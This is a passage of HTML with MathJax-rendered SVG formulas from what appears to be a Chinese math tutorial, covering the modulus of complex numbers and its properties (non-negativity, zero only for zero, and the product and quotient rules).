349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(743,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1298.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(2354.6,0)"><g transform="translate(1020,0)"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mn" transform="translate(533,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1158.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2159,0)"><g data-mml-node="mn"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mn" transform="translate(533,289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(0,204.2)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z"></path></g><rect width="3095.6" height="60" x="1020" y="994.2"></rect></g><g data-mml-node="mo" transform="translate(6747.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(7803.7,0)"><g transform="translate(853,0)"><g data-mml-node="mn"><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1722.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g><g data-mml-node="mo" transform="translate(0,107.3)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="2722.4" height="60" x="853" y="847.3"></rect></g><g data-mml-node="mo" transform="translate(11656.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msqrt" transform="translate(12712.7,0)"><g transform="translate(853,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path></g></g><g data-mml-node="mo" transform="translate(0,137.2)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="1000" height="60" x="853" y="877.2"></rect></g><g data-mml-node="mo" transform="translate(14843.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(15899.2,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></svg></mjx-container></p><p>复数的模具有以下性质：</p><ol><li><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="6.458ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 2854.6 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(743,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1298.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mn" transform="translate(2354.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>，即复数的模为非负实数。</p></li><li><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="6.458ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 2854.6 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(743,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1298.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2354.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container> 当且仅当 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="5.2ex" height="1.692ex" role="img" focusable="false" viewBox="0 -666 2298.6 748"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1798.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container>，即只有零向量的模为零。</p></li><li><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="14.95ex" height="2.26ex" role="img" focusable="false" viewBox="0 -749.5 6607.8 999"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="msub" transform="translate(1179.6,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2081.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(2636.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3692.7,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(3970.7,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(4872.2,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(5150.2,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(5428.2,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(6329.8,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g></g></svg></mjx-container>，即复数的模的乘积等于复数的乘积的模。</p></li><li><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.236ex;" xmlns="http://www.w3.org/2000/svg" width="10.04ex" height="3.604ex" role="img" focusable="false" viewBox="0 -1046.4 4437.7 1592.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mfrac" transform="translate(278,0)"><g data-mml-node="msub" transform="translate(220,446.1) scale(0.707)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="msub" transform="translate(220,-345) scale(0.707)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><rect width="837.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1355.5,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(1911.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(2967.1,0)"><g data-mml-node="mrow" transform="translate(220,516.4) scale(0.707)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mn" transform="translate(498,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1179.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mrow" transform="translate(220,-370) scale(0.707)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 